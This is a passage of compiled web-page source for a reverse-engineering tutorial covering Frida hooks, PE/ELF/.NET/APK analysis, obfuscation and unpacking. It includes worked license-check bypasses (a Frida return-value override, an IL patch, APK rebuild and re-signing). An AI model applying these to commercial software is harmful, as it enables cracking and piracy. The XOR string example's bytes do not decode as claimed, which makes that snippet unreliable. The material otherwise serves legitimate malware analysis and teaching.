normally)\n}\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Bypass:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# x64dbg: Set exception handling options\n# Options \u2192 Preferences \u2192 Exceptions \u2192 Pass all exceptions to debugged program\n"})}),"\n",(0,i.jsx)(n.h3,{id:"dynamic-instrumentation-frida",children:"Dynamic Instrumentation (Frida)"}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.strong,{children:"Frida"})," allows runtime modification without a debugger."]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Installing Frida:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Python:\npip install frida frida-tools\n\n# Verify:\nfrida --version\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Hooking functions:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-javascript",children:'// Frida JavaScript: Hook MessageBoxA on Windows\n// Save as hook.js\n\nInterceptor.attach(Module.findExportByName("user32.dll", "MessageBoxA"), {\n    onEnter: function(args) {\n        console.log("[MessageBoxA] Called!");\n        console.log("  hWnd: " + args[0]);\n        console.log("  Text: " + Memory.readUtf8String(args[1]));\n        console.log("  Title: " + Memory.readUtf8String(args[2]));\n        console.log("  Type: " + args[3]);\n\n        // Modify arguments:\n        args[1] = Memory.allocUtf8String("Hooked by Frida!");\n    },\n    onLeave: function(retval) {\n        console.log("[MessageBoxA] Return value: " + retval);\n    }\n});\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Running Frida script:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Attach to process by name:\nfrida -l hook.js -n malware.exe\n\n# Attach to process by PID:\nfrida -l hook.js -p 1234\n\n# Spawn new process:\nfrida -l hook.js -f malware.exe\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Frida examples:"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"1. Bypass license check:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-javascript",children:'// Hook check_license() function, force return TRUE\nvar base = Module.findBaseAddress("malware.exe");\nvar check_license = base.add(0x1234);  // Offset of function\n\nInterceptor.attach(check_license, {\n    onLeave: function(retval) {\n        console.log("Original return value: " + retval);\n        retval.replace(1);  // Force return TRUE\n        console.log("Modified to: 1 (license valid)");\n    }\n});\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"2. Dump decrypted strings:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-javascript",children:'// Hook decryption function, log decrypted output\nInterceptor.attach(Module.findExportByName(null, "decrypt_string"), {\n    onLeave: function(retval) {\n        var decrypted = Memory.readUtf8String(retval);\n        console.log("Decrypted string: " + decrypted);\n    }\n});\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"3. Trace all function calls:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-javascript",children:'// Trace all calls to functions in malware.exe\nvar moduleName = "malware.exe";\nvar module = Process.getModuleByName(moduleName);\n\nModule.enumerateExports(moduleName, {\n    onMatch: function(exp) {\n        if (exp.type === \'function\') {\n            Interceptor.attach(exp.address, {\n                onEnter: function(args) {\n                    console.log("[Call] " + exp.name + " @ " + exp.address);\n                }\n            });\n        }\n    },\n    onComplete: function() {}\n});\n'})}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsx)(n.h2,{id:"platform-specific-reversing",children:"Platform-Specific Reversing"}),"\n",(0,i.jsx)(n.h3,{id:"windows-pe-format",children:"Windows PE Format"}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.strong,{children:"PE (Portable Executable)"})," is the binary format for Windows executables (.exe, .dll, .sys)."]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"PE structure:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:'DOS Header (MZ header)\n  |\nDOS Stub ("This program cannot be run in DOS mode")\n  |\nPE Signature ("PE\\0\\0")\n  |\nCOFF Header (machine type, number of sections, timestamp)\n  |\nOptional Header (entry point, image base, section alignment)\n  |\nSection Headers (.text, .data, .rdata, .rsrc)\n  |\nSections (actual code and data)\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Key PE components:"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"1. DOS Header (offset 0x0):"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-c",children:'typedef struct _IMAGE_DOS_HEADER {\n    WORD e_magic;      // "MZ" (0x5A4D)\n    // ...\n    LONG e_lfanew;     // Offset to PE header\n} IMAGE_DOS_HEADER;\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"2. PE Header:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-c",children:'typedef struct _IMAGE_NT_HEADERS {\n    DWORD Signature;   // "PE\\0\\0" (0x4550)\n    IMAGE_FILE_HEADER FileHeader;\n    IMAGE_OPTIONAL_HEADER OptionalHeader;\n} IMAGE_NT_HEADERS;\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"3. Optional Header (contains entry point):"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-c",children:"typedef struct _IMAGE_OPTIONAL_HEADER {\n    // ...\n    DWORD AddressOfEntryPoint;  // RVA of entry point\n    DWORD ImageBase;            // Preferred load address (e.g., 0x400000)\n    // ...\n} IMAGE_OPTIONAL_HEADER;\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"4. Sections:"})}),"\n",(0,i.jsxs)(n.table,{children:[(0,i.jsx)(n.thead,{children:(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.th,{children:"Section"}),(0,i.jsx)(n.th,{children:"Purpose"})]})}),(0,i.jsxs)(n.tbody,{children:[(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.code,{children:".text"})}),(0,i.jsx)(n.td,{children:"Executable code"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.code,{children:".data"})}),(0,i.jsx)(n.td,{children:"Initialized data (global variables)"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.code,{children:".rdata"})}),(0,i.jsx)(n.td,{children:"Read-only data (strings, constants)"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.code,{children:".bss"})}),(0,i.jsx)(n.td,{children:"Uninitialized data"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.code,{children:".rsrc"})}),(0,i.jsx)(n.td,{children:"Resources (icons, dialogs, version info)"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.code,{children:".reloc"})}),(0,i.jsx)(n.td,{children:"Relocation table (for ASLR)"})]})]})]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"5. Import Address Table (IAT):"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"List of imported functions from DLLs"}),"\n",(0,i.jsx)(n.li,{children:"Resolved at runtime by Windows loader"}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"6. Export Address Table (EAT):"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"List of exported functions (for DLLs)"}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Analyzing PE with tools:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# PEview (Windows GUI):\n# https://wjradburn.com/software/\n# Shows PE structure, sections, imports, exports\n\n# PE-bear (Windows GUI):\n# https://github.com/hasherezade/pe-bear-releases\n# Advanced PE editor and analyzer\n\n# pefile (Python):\npip install pefile\n\npython3\n>>> import pefile\n>>> pe = pefile.PE("malware.exe")\n>>> print(hex(pe.OPTIONAL_HEADER.AddressOfEntryPoint))\n>>> for section in pe.sections:\n...     print(section.Name.decode(), hex(section.VirtualAddress))\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Finding entry point:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-python",children:'import pefile\n\npe = pefile.PE("malware.exe")\nentry_point_rva = pe.OPTIONAL_HEADER.AddressOfEntryPoint\nimage_base = pe.OPTIONAL_HEADER.ImageBase\nentry_point_va = image_base + entry_point_rva\nprint(f"Entry point: 0x{entry_point_va:X}")\n'})}),"\n",(0,i.jsx)(n.h3,{id:"linux-elf-format",children:"Linux ELF Format"}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.strong,{children:"ELF (Executable and Linkable Format)"})," is the binary format for Linux/Unix executables."]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"ELF structure:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"ELF Header\n  |\nProgram Headers (segments for runtime)\n  |\nSection Headers (.text, .data, .bss, .rodata, etc.)\n  |\nSections (actual code and data)\n  |\nSymbol Table (functions, variables)\n  |\nString Table (symbol names)\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Key ELF components:"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"1. ELF Header:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-c",children:"typedef struct {\n    unsigned char e_ident[16];  // Magic: 0x7F, 'E', 'L', 'F'\n    uint16_t e_type;            // Type: ET_EXEC (executable), ET_DYN (shared object)\n    uint16_t e_machine;         // Architecture: EM_386 (x86), EM_X86_64 (x64), EM_ARM\n    // ...\n    uint64_t e_entry;           // Entry point address\n} Elf64_Ehdr;\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"2. Program Headers (segments):"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.code,{children:"LOAD"}),": Loadable segment (mapped into memory)"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.code,{children:"DYNAMIC"}),": Dynamic linking information"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.code,{children:"INTERP"}),": Path to interpreter (e.g., /lib64/ld-linux-x86-64.so.2)"]}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"3. Sections:"})}),"\n",(0,i.jsxs)(n.table,{children:[(0,i.jsx)(n.thead,{children:(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.th,{children:"Section"}),(0,i.jsx)(n.th,{children:"Purpose"})]})}),(0,i.jsxs)(n.tbody,{children:[(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.code,{children:".text"})}),(0,i.jsx)(n.td,{children:"Executable code"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.code,{children:".data"})}),(0,i.jsx)(n.td,{children:"Initialized data"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.code,{children:".bss"})}),(0,i.jsx)(n.td,{children:"Uninitialized data"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.code,{children:".rodata"})}),(0,i.jsx)(n.td,{children:"Read-only data (strings)"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.code,{children:".plt"})}),(0,i.jsx)(n.td,{children:"Procedure Linkage Table (for dynamic linking)"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.code,{children:".got"})}),(0,i.jsx)(n.td,{children:"Global Offset Table (addresses of imported functions)"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.code,{children:".symtab"})}),(0,i.jsx)(n.td,{children:"Symbol table"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.code,{children:".strtab"})}),(0,i.jsx)(n.td,{children:"String table"})]})]})]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"4. GOT (Global Offset Table) and PLT (Procedure Linkage Table):"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"GOT:"})," Contains addresses of external functions (resolved at runtime)"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"PLT:"})," Stub code that jumps to GOT entries"]}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Example (calling printf):"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-nasm",children:"; First call to printf:\ncall printf@plt         ; Jump to PLT stub\n\n; PLT stub:\nprintf@plt:\njmp [printf@got]        ; Jump to address in GOT (initially resolver)\npush 0                  ; Push relocation index\njmp _dl_runtime_resolve ; Resolve printf address, update GOT\n\n; Subsequent calls:\ncall printf@plt         ; Jump to PLT stub\nprintf@plt:\njmp [printf@got]        ; GOT now contains real printf address\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Analyzing ELF with tools:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# readelf (view ELF headers):\nreadelf -h program         # ELF header\nreadelf -l program         # Program headers (segments)\nreadelf -S program         # Section headers\nreadelf -s program         # Symbol table\nreadelf -r program         # Relocations\n\n# objdump (disassemble):\nobjdump -d program         # Disassemble .text section\nobjdump -D program         # Disassemble all sections\nobjdump -M intel -d program  # Intel syntax\n\n# file (identify file type):\nfile program\n# Output: ELF 64-bit LSB executable, x86-64\n\n# ldd (list dynamic dependencies):\nldd program\n# Output: libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Finding entry point:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"readelf -h program | grep Entry\n# Output: Entry point address: 0x401050\n"})}),"\n",(0,i.jsx)(n.h3,{id:"net-reversing",children:".NET Reversing"}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.strong,{children:".NET assemblies"})," are compiled to CIL (Common Intermediate Language), not native code."]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Why .NET is easier to reverse:"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"CIL is high-level (closer to source code than assembly)"}),"\n",(0,i.jsx)(n.li,{children:"Metadata preserves class/method/variable names (unless obfuscated)"}),"\n",(0,i.jsx)(n.li,{children:"Decompilers produce near-source-quality C# code"}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Tools:"})}),"\n",(0,i.jsxs)(n.table,{children:[(0,i.jsx)(n.thead,{children:(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.th,{children:"Tool"}),(0,i.jsx)(n.th,{children:"Purpose"})]})}),(0,i.jsxs)(n.tbody,{children:[(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"dnSpy"})}),(0,i.jsx)(n.td,{children:".NET decompiler & debugger (best all-in-one tool)"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"ILSpy"})}),(0,i.jsx)(n.td,{children:".NET decompiler (open-source)"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"dotPeek"})}),(0,i.jsx)(n.td,{children:".NET decompiler (JetBrains, free)"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"de4dot"})}),(0,i.jsx)(n.td,{children:".NET deobfuscator"})]})]})]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"dnSpy usage:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Windows: Launch dnSpy.exe\ndnSpy.exe\n\n# Open .NET assembly:\n# File \u2192 Open \u2192 Select .exe or .dll\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"dnSpy features:"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"1. Decompiled C# code:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-csharp",children:'// Original source (approximately):\npublic class LicenseChecker {\n    public static bool CheckLicense(string key) {\n        string validKey = "ABC123-XYZ789";\n        if (key == validKey) {\n            return true;\n        }\n        return false;\n    }\n}\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"2. IL (Intermediate Language) view:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-il",children:'.method public static bool CheckLicense(string key) cil managed {\n    .maxstack 2\n    .locals init ([0] bool result)\n\n    ldstr "ABC123-XYZ789"\n    ldarg.0\n    call bool [mscorlib]System.String::op_Equality(string, string)\n    stloc.0\n    ldloc.0\n    ret\n}\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"3. Editing & patching:"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["Right-click on method \u2192 ",(0,i.jsx)(n.strong,{children:"Edit IL Instructions"})]}),"\n",(0,i.jsx)(n.li,{children:"Modify IL code (e.g., change comparison to always return true)"}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"File \u2192 Save Module"})," (save patched binary)"]}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Example: Bypass license check:"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Before:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-csharp",children:"if (key == validKey) {\n    return true;\n}\nreturn false;\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Patch IL:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-il",children:'; Change conditional to always return true:\n; Replace "call bool System.String::op_Equality" with:\npop       ; Discard comparison result\npop       ; Discard arguments\nldc.i4.1  ; Push TRUE (1)\nret\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"de4dot (deobfuscation):"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Remove obfuscation from .NET binary:\nde4dot.exe obfuscated.exe\n\n# Output: obfuscated-cleaned.exe (deobfuscated)\n"})}),"\n",(0,i.jsx)(n.h3,{id:"android-apk-reversing",children:"Android APK Reversing"}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.strong,{children:"APK (Android Package)"})," is a ZIP file containing:"]}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"classes.dex:"})," Dalvik bytecode (compiled Java/Kotlin)"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"lib/:"})," Native libraries (.so files for ARM/x86)"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"res/:"})," Resources (images, layouts)"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"AndroidManifest.xml:"})," App permissions and components"]}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Tools:"})}),"\n",(0,i.jsxs)(n.table,{children:[(0,i.jsx)(n.thead,{children:(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.th,{children:"Tool"}),(0,i.jsx)(n.th,{children:"Purpose"})]})}),(0,i.jsxs)(n.tbody,{children:[(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"JADX"})}),(0,i.jsx)(n.td,{children:"DEX to Java decompiler (GUI & CLI)"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"Apktool"})}),(0,i.jsx)(n.td,{children:"Decode APK to smali (Dalvik assembly)"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"dex2jar"})}),(0,i.jsx)(n.td,{children:"Convert DEX to JAR (for JD-GUI)"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"Frida"})}),(0,i.jsx)(n.td,{children:"Dynamic instrumentation for Android"})]}),(0,i.jsxs)(n.tr,{children:[(0,i.jsx)(n.td,{children:(0,i.jsx)(n.strong,{children:"Ghidra"})}),(0,i.jsx)(n.td,{children:"Reverse native libraries (.so files)"})]})]})]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"JADX usage:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Install JADX:\n# https://github.com/skylot/jadx/releases\n\n# Decompile APK:\njadx app.apk -d output_dir\n\n# Or use GUI:\njadx-gui app.apk\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"JADX output:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-java",children:'// Decompiled Java code (from classes.dex):\npublic class MainActivity extends AppCompatActivity {\n    private void checkLicense() {\n        String license = "VALID-LICENSE-KEY";\n        String userInput = editText.getText().toString();\n        if (userInput.equals(license)) {\n            Toast.makeText(this, "Access granted!", Toast.LENGTH_SHORT).show();\n        } else {\n            Toast.makeText(this, "Invalid license", Toast.LENGTH_SHORT).show();\n        }\n    }\n}\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Apktool usage:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Decode APK to smali (Dalvik assembly):\napktool d app.apk -o app_decoded\n\n# Output directory structure:\n# app_decoded/\n#   smali/          (Dalvik assembly code)\n#   res/            (resources)\n#   AndroidManifest.xml\n\n# Edit smali code, then rebuild:\napktool b app_decoded -o app_modified.apk\n\n# Sign APK:\njarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 \\\n  -keystore my.keystore app_modified.apk alias_name\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Analyzing native libraries (.so files):"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# APK may contain native ARM/x86 libraries in lib/:\n# lib/armeabi-v7a/libnative.so\n# lib/arm64-v8a/libnative.so\n# lib/x86/libnative.so\n\n# Extract .so file from APK:\nunzip app.apk lib/arm64-v8a/libnative.so\n\n# Analyze in Ghidra:\n# File \u2192 Import File \u2192 libnative.so\n# Analyze with default settings\n"})}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsx)(n.h2,{id:"anti-reversing-techniques",children:"Anti-Reversing Techniques"}),"\n",(0,i.jsx)(n.h3,{id:"obfuscation",children:"Obfuscation"}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.strong,{children:"Obfuscation"})," makes code harder to understand without changing functionality."]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Control flow obfuscation:"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Before (simple if statement):"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-c",children:'if (password == "correct") {\n    access_granted();\n} else {\n    access_denied();\n}\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"After (obfuscated with opaque predicates):"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-c",children:'int x = (rand() % 2 == 0) ? 1 : 1;  // Always 1, but hard to analyze statically\nif (x == 1) {\n    if (password == "correct") {\n        access_granted();\n    } else {\n        access_denied();\n    }\n}\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"String obfuscation (XOR encoding):"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-c",children:'// Hardcoded string is visible in binary\nchar password[] = "secret123";\n\n// Obfuscated (XOR with key):\nchar enc[] = {0x10, 0x02, 0x00, 0x15, 0x02, 0x11, 0x56, 0x54, 0x50};\nchar password[10];\nfor (int i = 0; i < 9; i++) {\n    password[i] = enc[i] ^ 0x42;  // XOR with 0x42\n}\npassword[9] = \'\\0\';\n// Result: "secret123"\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Defeating string obfuscation:"})}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsx)(n.li,{children:"Find decoding loop in disassembly"}),"\n",(0,i.jsx)(n.li,{children:"Extract encoded data and XOR key"}),"\n",(0,i.jsx)(n.li,{children:"Decode manually or with script"}),"\n"]}),"\n",(0,i.jsx)(n.h3,{id:"packing",children:"Packing"}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.strong,{children:"Packing"})," compresses or encrypts the entire binary, unpacking at runtime."]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Common packers:"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"UPX:"})," Universal Packer for eXecutables (open-source, easy to unpack)"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Themida:"})," Commercial packer with anti-debugging and virtualization"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"VMProtect:"})," Virtualizes code (converts to custom VM instructions)"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Enigma Protector:"})," Packer with anti-debugging and virtualization"]}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Detecting packed binaries:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# High entropy (compressed/encrypted data):\n# Use "Detect It Easy" (DiE): https://github.com/horsicq/Detect-It-Easy\n\n# Or check entropy manually:\nent malware.exe\n# Entropy > 7.0 suggests packing/encryption\n\n# Check for known packer signatures:\n# IDA Pro: "UPX0", "UPX1" sections\n# PE sections with unusual names (.vmp, .themida, etc.)\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Unpacking UPX:"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# UPX can be unpacked with official unpacker:\nupx -d packed.exe -o unpacked.exe\n\n# Manual unpacking (if UPX modified):\n# 1. Find OEP (Original Entry Point) via debugger\n# 2. Set breakpoint on "pushad" instruction (typical UPX stub)\n# 3. Run until unpacking complete\n# 4. Dump process memory to file\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Manual unpacking process:"})}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Load in debugger"})," (x64dbg)"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Find tail jump"})," (last jump before OEP)","\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["UPX typically has a ",(0,i.jsx)(n.code,{children:"jmp &lt;OEP&gt;"})," at end of unpacking stub"]}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Set breakpoint"})," on tail jump"]}),"\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.strong,{children:"Run until breakpoint hit"})}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Step into jump"})," (F7) \u2192 now at OEP"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Dump process"})," (Scylla plugin in x64dbg):","\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Plugins \u2192 Scylla \u2192 Dump \u2192 Select process \u2192 Dump"}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Fix imports"})," (Scylla):","\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"IAT 